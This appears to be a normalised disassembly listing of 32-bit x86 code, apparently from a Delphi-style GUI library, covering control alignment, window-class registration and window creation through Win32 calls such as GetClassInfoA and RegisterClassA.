je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4426d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_4124bc
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43e849
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e850
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_43e75e ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43e6c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_43e850
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_43e87f ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_43e908
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f0fc
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4137bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_413918
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43e4c8
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43f0c0
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413994
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_413918
mov edx eax
mov ecx ebx
mov eax edi
call sub_43e43c
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43ea78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_43f0fc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_43f0c0
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_43f0c0
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43eacc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43ea78
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43ebab
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43e908
pop ecx
push ebp
mov al 0x2
call sub_43e908
pop ecx
push ebp
mov al 0x3
call sub_43e908
pop ecx
push ebp
mov al 0x4
call sub_43e908
pop ecx
push ebp
mov al 0x5
call sub_43e908
pop ecx
push ebp
mov al 0x6
call sub_43e908
pop ecx
push ebp
xor eax eax
call sub_43e908
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403224
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403420
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43ebd0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4426d0
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ec64
xor eax eax
push ebp
push sub_43ec57
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43ec6c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43ec94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43ed59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43b5d0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ed60
mov eax [ ebp - 0xc ]
call sub_403224
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4137bc
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43b33c
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413918
xor ecx ecx
mov edx 0xb03e
call sub_43cd98
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_43ed68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43f0fc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43ec64
xor edx edx
push ebp
push sub_43ee4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4137bc
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_413918
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403224
mov eax [ ebp - 0x4 ]
call sub_43ec6c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43b0e0
mov dl 0x4
call sub_43b0e0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413808
sub_43eebc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_452980
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_4566a4
sub_43eedc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43a4c0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43a4c0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43a4c0
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_43ef28
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43a4e8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43a4e8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43a4e8
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43ef70
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403420
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43cd98
mov edx ebx
mov eax edi
call sub_43eedc
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43cd98
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43cd98
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax edi
call sub_4426d0
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43cd98
mov eax edi
call sub_43fac0
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43ebd0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f044
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43cd98
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax esi
call sub_4426d0
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_43eebc
mov eax ebp
call sub_43f924
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43ef28
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43cd98
mov eax esi
call sub_43ec8c
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43c014
sub_43f0c0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_413918
mov edx edi
mov eax ebp
call sub_413918
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43f11c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_43f0fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43f0c0
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_43f15c
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_43f11c
add esp 0x10
retn
sub_43f184
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_43f1f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43c228
test al al
je r-xdata
mov eax ebx
call sub_43c258
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403420
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403420
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403420
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43f258
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43f376
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c40
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43f1f0
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4423cc
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403174
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041c0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f37d
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_43f384
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43f545
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_4389c0
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_4389c0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c774
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c774
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_4086e0
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_4426dc
push 0x1
mov eax [ esi + 0x68 ]
call sub_41c4d8
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43cd98
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4423cc
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f54c
lea eax [ ebp - 0xc0 ]
call sub_403f5c
retn
mov eax esi
